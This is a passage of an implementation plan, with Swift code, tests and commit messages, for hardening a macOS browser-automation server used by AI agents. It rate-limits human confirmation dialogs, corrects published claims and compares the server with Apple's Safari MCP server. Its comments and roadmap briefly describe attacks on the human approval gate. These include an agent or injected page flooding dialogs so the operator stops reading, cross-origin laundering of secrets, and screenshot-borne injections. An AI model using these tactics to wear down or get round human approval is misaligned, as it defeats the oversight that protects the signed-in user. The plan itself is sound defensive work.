Create `Sources/WebKitUIMCPCore/ConfirmationRatePolicy.swift`:

```swift
import Foundation

/// How many confirmations have been asked for recently.
///
/// The safety of this product rests on a human reading a dialog. An agent, or an
/// injected page driving one, can ask fifty times in a minute and train the operator to
/// click through; OWASP files that as the clickthrough vulnerability. Refusing outright
/// would break ordinary work, so a burst is named in the dialog and a flood is refused.
public struct ConfirmationRatePolicy: Equatable, Sendable {
  public enum Verdict: Equatable, Sendable {
    case normal
    /// Show the count in the dialog. An operator who is told this is the ninth request
    /// in a minute has the one fact that makes a flood legible.
    case burst(recentCount: Int)
    /// Do not present. Return an error naming the count.
    case refuse(recentCount: Int)
  }

  public static let burstThreshold = 5
  public static let refuseThreshold = 20
  public static let windowNanoseconds: UInt64 = 60_000_000_000

  private var recent: [UInt64] = []

  public init() {}

  public mutating func record(atMonotonicNanoseconds now: UInt64) -> Verdict {
    recent.removeAll { now >= $0 && now - $0 > Self.windowNanoseconds }
    recent.append(now)
    let count = recent.count
    if count >= Self.refuseThreshold { return .refuse(recentCount: count) }
    if count >= Self.burstThreshold { return .burst(recentCount: count) }
    return .normal
  }
}
```

- [ ] **Step 4: Run it to verify it passes**

```bash
swift test --arch arm64 --no-parallel --filter ConfirmationRatePolicyTests
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Wire it into the server, and only into the native path**

The MCP elicitation path is the client's own UI and already subject to whatever the client does. Apply this where the server presents its own dialog. Find the presenter call:

```bash
grep -n 'confirmationPresenter' Sources/WebKitUIMCPServer/MCPServer.swift | head
```

Add one `ConfirmationRatePolicy` per session, consult it immediately before presenting, and:

- `.normal` — present unchanged.
- `.burst(let count)` — prepend one line to the message: `"This is request \(count) in the last minute."`
- `.refuse(let count)` — do not present; throw an error whose message names the count and says to wait, so the agent learns rather than retries blindly.

- [ ] **Step 6: Write the failing server test and make it pass**

```swift
  @Test("A flood of confirmations is refused instead of shown")
  func confirmationFloodIsRefused() async throws {
    // Twenty dialogs in a minute is not a workflow; it is an attempt to make the human
    // stop reading. The refusal names the count so the agent is told why.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<button>Save</button>", baseURL: URL(string: "https://example.test/start"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    var lastError: JSONValue?
    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
      let observed = try await toolCall(
        server, id: Int64(1000 + index * 2), name: "browser_observe",
        arguments: ["session_id": .string(handle.rawValue.uuidString)])
      let observation = try object(try object(observed["result"])["structuredContent"])
      let target = try object(try array(observation["elements"]).first)
      let acted = try await toolCall(
        server, id: Int64(1001 + index * 2), name: "browser_act",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "observation_id": .string(try string(observation["observationID"])),
          "element_id": .string(try string(target["elementID"])),
          "operation": .string("click"),
          "idempotency_key": .string("flood-\(index)"),
          "postcondition": .object([
            "type": .string("url_equals"), "value": .string("https://example.test/done"),
          ]),
        ])
      lastError = acted["error"]
    }

    let error = try object(lastError)
    #expect(try string(error["message"]).contains("in the last minute"))
    #expect(
      presenter.requests.count <= ConfirmationRatePolicy.refuseThreshold,
      "the flood was presented to the operator instead of refused")
  }
```

- [ ] **Step 7: Full suite, lint, commit**

```bash
xcrun swift-format lint --strict --recursive Sources Tests Package.swift
swift test --arch arm64 --no-parallel --skip hostExclusiveSession
git add Sources/WebKitUIMCPCore/ConfirmationRatePolicy.swift \
  Tests/WebKitUIMCPCoreTests/ConfirmationRatePolicyTests.swift \
  Sources/WebKitUIMCPServer/MCPServer.swift \
  Tests/WebKitUIMCPServerTests/MCPServerTests.swift
git commit -F - <<'EOF'
feat: name a burst of confirmations and refuse a flood

Nothing limited how often this product could ask a human to approve something,
and its whole safety argument is that the human reads the dialog. Twenty requests
in a minute is not a workflow; it is an attempt to make the operator stop reading,
and OWASP files it as the clickthrough vulnerability.

From the fifth request in a minute the dialog states which request it is, which
is the one fact that makes a flood legible. From the twentieth the request is
refused with an error naming the count, so the agent is told why instead of
retrying blindly. The window forgets, so a long session is not punished for its
past. Only the server's own dialog is governed; the MCP elicitation path is the
client's own interface.

Evidence: docs/research/2026-09-09-agentic-browser-security-sota.md, gap 4.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
EOF
```

---

## Task 4: Publish only what the research supports

Four published claims were refuted. The comparison with Apple's server currently exists only in a forum reply, and the refusals — which are the product — are not stated next to the promise.

**Files:**
- Modify: `README.md`
- Modify: `docs/network-boundary.md`
- Modify: `Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift`

Task 4 must also state that the `WKFormInfo` gate is implemented and untriggered on
macOS 27.0 build 26A5419a. A gate described as live when it never fires is the same class
of false claim as the two this task exists to remove.

- [ ] **Step 1: Write the failing test**

Add to `CapabilityClaimsCoherenceTests`:

```swift
  private static func text(_ relativePath: String) throws -> String {
    try String(
      contentsOf: projectRoot.appendingPathComponent(relativePath), encoding: .utf8)
  }

  @Test("The README names every capability this product refuses, and why")
  func refusalsAreDocumented() throws {
    let readme = try Self.text("README.md")
    for refusal in ["arbitrary JavaScript", "raw CDP escape hatch", "subresource", "tabs"] {
      #expect(readme.contains(refusal), "README no longer explains refusing: \(refusal)")
    }
  }

  @Test("The README makes no claim the research refuted")
  func refutedClaimsAreAbsent() throws {
    let readme = try Self.text("README.md")
    // Each of these was published and is false. safaridriver dispatches NSEvent through
    // [window sendEvent:] exactly as this does; Claude in Chrome shipped per-action
    // approval first; Browserbase exposes six tools with no evaluate; and WebKit does
    // expose subresource inspection, through proxyConfigurations and WKWebExtension.
    for claim in [
      "only MCP browser", "first to", "unique in", "no API for inspecting",
      "hashed prefixes",
    ] {
      #expect(!readme.contains(claim), "README makes a refuted claim: \(claim)")
    }
  }
```

- [ ] **Step 2: Run it to verify it fails**

```bash
swift test --arch arm64 --no-parallel --filter 'refusalsAreDocumented|refutedClaimsAreAbsent'
```

Expected: FAIL on `subresource` and `tabs`.

- [ ] **Step 3: Rewrite the deliberate limits**

In `README.md`, replace the single refusal line with:

```markdown
- No arbitrary JavaScript, raw CDP escape hatch, coordinate retry, proxy fleet, anti-bot bypass, or headless claim. A gate an agent can step around is not a gate: one JavaScript-evaluation call would do anything the confirmation exists to authorize one action at a time. Browserbase's MCP server also refuses JavaScript; the combination refused here is a JavaScript tool *and* a per-action gate *and* a real authenticated session.
- No multiple tabs. One session holds one exclusive host lease, which is what lets an approval refer to an unambiguous page.
- No subresource or XHR request inspection. It is possible — `WKWebsiteDataStore.proxyConfigurations` is public and Apple's own recommendation for reading WKWebView traffic, and a bundled `WKWebExtension` with `webRequest` is public from macOS 15.4 — and it is not offered. The proxy route needs a trusted root certificate to see HTTPS, and the extension route reports no headers. The main frame's HTTP status comes from the navigation delegate instead, and the egress proxy names the hosts it allowed and refused.
- Native AppKit dispatch is not a distinguishing feature and is not claimed as one. `safaridriver` dispatches `NSEvent` through `[window sendEvent:]` exactly as this does, and the WebDriver specification requires every conformant driver to produce trusted events. What differs is the measurement: an action whose trusted DOM receipt is missing or mismatched fails indeterminate here, where Playwright's hit-target interceptor treats an absent event as success.
```

- [ ] **Step 4: Add the comparison, with only cited facts**

After `## Deliberate limits`:

```markdown
## Compared with the Safari MCP server

Apple's Safari MCP server ships inside `safaridriver`, is started with
`safaridriver --mcp`, and exposes seventeen tools — page content, screenshots, network
requests, console logs, JavaScript evaluation, DOM interaction, viewport and media
emulation, tab management. It needs "Show features for web developers" in Settings >
Advanced and "Allow remote automation and external agents" in Settings > Developer. Apple
aims it at web developers: it "gives your agent the ability to know how your code actually
renders in the browser", and both sets of release notes file it under WebDriver > New
Features. For developing a site it is the better tool, it is included with Safari, and
this project does not compete with it.

The difference is what happens when the site is not yours and you are signed in to it:

| | Safari MCP server | WebKitUI MCP |
| --- | --- | --- |
| Purpose | inspect and debug a site you are developing | act on a site you are signed in to |
| Approval | no confirmation step is documented, and no tool requests one | native macOS confirmation before every exposed click and open-world navigation |
| Tool annotations | none: every tool carries only `name`, `description`, `inputSchema`, so a client gets no signal separating page reading from JavaScript evaluation | `readOnlyHint` and `destructiveHint` per tool |
| JavaScript evaluation | exposed as a tool | absent, with no CDP or coordinate fallback |
| Session | Apple's WebDriver documentation states automation windows are "isolated from normal browsing windows, user settings, and preferences" and that a session "always starts from a clean slate" | its own `WKWebView` and its own persistent profile, which is what authenticated work requires |
| Protocol | reports `2024-11-05` | `2026-07-28`, the current revision |
| Network detail | full request inspection | main-frame HTTP status from the navigation delegate, and the hosts the egress proxy allowed or refused |
| Verification | inspection tools | an explicit postcondition per action, plus separate `confirmation_mode`, `dispatch_mode` and `trusted_gesture_state` |

Both can be installed at once, and for most developers both should be.

Two things this project will not say about Apple's server, because Apple does not: that it
cannot reach your cookies or your logged-in sessions — Apple's MCP post names AutoFill and
"other browser activity" only — and that Apple states there is no confirmation step. The
absence is documented; a denial is not.
```

- [ ] **Step 5: Correct the network boundary document**

In `docs/network-boundary.md`, in the list of things the boundary does not claim:

```
- Per-subresource request inspection. It is not offered, and it is not impossible:
  `WKWebsiteDataStore.proxyConfigurations` is public and is Apple's own recommendation
  for reading WKWebView request contents, and a bundled `WKWebExtension` with the
  `webRequest` permission is public from macOS 15.4. Neither is free — the proxy needs a
  trusted root certificate to see inside HTTPS, and the extension route reports no
  headers and cannot block. Until one is adopted, the main frame's HTTP status comes
  from the navigation delegate and the proxy names the hosts it allowed and refused.
```

- [ ] **Step 6: Run, lint, commit**

```bash
swift test --arch arm64 --no-parallel --filter '^WebKitUIMCPServerTests\.'
xcrun swift-format lint --strict --recursive Sources Tests Package.swift
git add README.md docs/network-boundary.md \
  Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift
git commit -F - <<'EOF'
docs: publish only what the research supports, and say what is refused

Four published claims were refuted on 2026-09-09 and are now absent, pinned by a
test that fails if any returns: native AppKit dispatch is not distinctive
(safaridriver does the identical thing and the WebDriver specification requires
trusted events); per-action approval is not a first (Claude in Chrome shipped it);
refusing JavaScript is not unique (Browserbase exposes six tools with no
evaluate); and "WebKit exposes no subresource-inspection API" is false —
proxyConfigurations and WKWebExtension webRequest are both public, and the honest
statement is that neither is offered and what each would cost.

The comparison with Apple's server is stated from primary sources only:
seventeen tools, the two settings and their panes, no documented confirmation
step, no tool annotations at all, protocol 2024-11-05, and the WebDriver
isolation wording attributed to Apple's WebDriver documentation rather than to
the MCP announcement. Two tempting claims are explicitly not made, because Apple
does not make them.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
EOF
```

---

## Deferred, in order, and why

These were Tasks 2 to 4 of this plan's first version. They remain worth doing and are no longer first.

1. **Main-frame HTTP status on the navigation result.** The delegate hook exists at `decidePolicyFor navigationResponse` and already reads `statusCode` for downloads; the result is encoded whole, so a defaulted `var` surfaces automatically. Add three caveats the research established: the cast must be conditional, redirect-hop statuses are unavailable in API and SPI alike, and the callback is skipped on back/forward-cache resumes.
2. **Console and uncaught-error journal**, bounded and labelled untrusted site content. No official API exists — `_webView:didReceiveConsoleLogForTesting:` is SPI, named `ForTesting`, and delivers a flat string — so an injected forwarder in the instrumentation world is correct, and the page's own `console` stays unpatched.
3. **Contacted and refused hosts on the proxy metrics.** Counters exist; the host lists do not.

## Not in this plan

Each needs its own plan; none is code with a test cycle.

1. **Provider proof matrix** — dated, independently read-back journeys for Stripe, Google Play Console and Cloudflare. The parent spec's P0 exit gate and still the largest gap.
2. **Physical-Mac authentication tests** — locked Mac, closed lid, Touch ID lockout, Apple Watch, password fallback, cancellation, timeout.
3. **Intra-page trust segmentation** — the general form of Task 1. Prismata measures 85.5% to 0.7% attack success at 3.3 percentage points of utility. Task 1 closes the demonstrated instance; this closes the class.
4. **Dataflow and capability tracking** — a secret read on origin A laundering into a form on origin B with every step approved. CaMeL, Fides, Progent.
5. **Task-alignment checking** — a postcondition proves the outcome, never the intent.
6. **Adversarial benchmarking** — this product has never been measured against any injection benchmark. Residual risk is unknown, not low: NIST/CAISI moved one system from 11% to 81% attack success by strengthening the attack alone.
7. **Screenshot and OCR provenance** — the capture path sits outside the labelling scheme, and Brave demonstrated injections that are invisible to a human but not to a model.
8. **`WKJSHandle` adoption (macOS 27)** — a durable, GC-protected reference to a live JavaScript object carrying `sourceFrame` and `contentWorld`, degrading to `undefined` when the frame navigates. The element-handle primitive WKWebView never had; the repository already carries a `WKJSHandleProbe` target.
9. **Commercial and legal truth**, and an independent review of the gesture and credential boundary.

Per-project auto-approval stays out of both lists. Its constraints are in
`docs/research/2026-09-01-goal-delegation-and-browser-addressing-sota.md`, it needs a
shadow-mode campaign with zero false allows first, and the hard NO-GO classes do not move.

## Self-review

- **Spec coverage.** The refuted claims each have a task: dispatch distinctiveness, JavaScript uniqueness, subresource impossibility and the fraud-check mechanism (already committed in `6ce4807`). The security research's gap 1 has Task 1 for the demonstrated instance and a deferred entry for the class; gap 4 has Task 3. Gaps 2, 3, 5, 6 and 7 are listed as needing their own plans, with reasons.
- **Placeholder scan.** No TBD and no "add error handling". Five steps open with a `grep` because the insertion point sits in a file of nearly five thousand lines where an anchor string stays correct and a line number does not: Task 1 steps 5, 9 and 11, Task 2 step 6, Task 3 step 5. Each names the string to find and the exact code to add. Task 1 step 7 states what to do if `ConfirmationPresenterStub` records a different shape; Task 2 step 8 states what to do when the Mac is not on macOS 27.
- **Type consistency.** `SubmissionDestination.line(pageURL:destination:)` is defined in Task 1 step 3 and called in step 9 with the same labels. `WebKitObservedElement.submissionDestination` is a `String?` in step 6, produced by the JavaScript in step 5, and read in step 9. `SubmissionApproval.Decision` cases `.allow`, `.refuseForeignOrigin(String)` and `.refuseUnapproved` are defined in Task 2 step 3, asserted in step 1 and switched in step 6. `WebKitSubmissionFacts` fields `origin`, `httpMethod`, `fieldCount`, `fieldNames` are declared in step 5 and asserted in step 7. `ConfirmationRatePolicy.Verdict` cases and the three static thresholds are defined in Task 3 step 3 and used in steps 1, 5 and 6. `WKFormInfo`'s property names are copied from `MacOSX27.0.sdk/.../WKFormInfo.h` rather than recalled.
